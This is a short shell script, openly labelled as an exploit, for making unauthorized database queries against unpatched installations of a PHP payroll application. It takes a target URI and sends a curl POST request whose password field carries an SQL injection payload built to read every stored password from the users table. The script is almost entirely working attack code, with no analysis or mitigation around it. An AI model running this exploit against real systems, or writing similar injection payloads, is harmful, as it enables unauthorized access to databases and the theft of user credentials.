#!/bin/sh
#
# Author: Mason Soroka-Gill
#
# This script can be used to make unauthorized queries to the
# database behind any unpatched instance of payroll_app.php
#

if [ $# != 1 ]; then
    echo "Usage:"
    echo "$0 target_uri"
    echo "Example:"
    echo "$0 http://10.25.100.24/payroll_app.php"
    exit 1
fi

uri=$1

curl -X POST $uri --data "user=nobody&password=a'; select password from users where username='' OR ''='&s=OK"

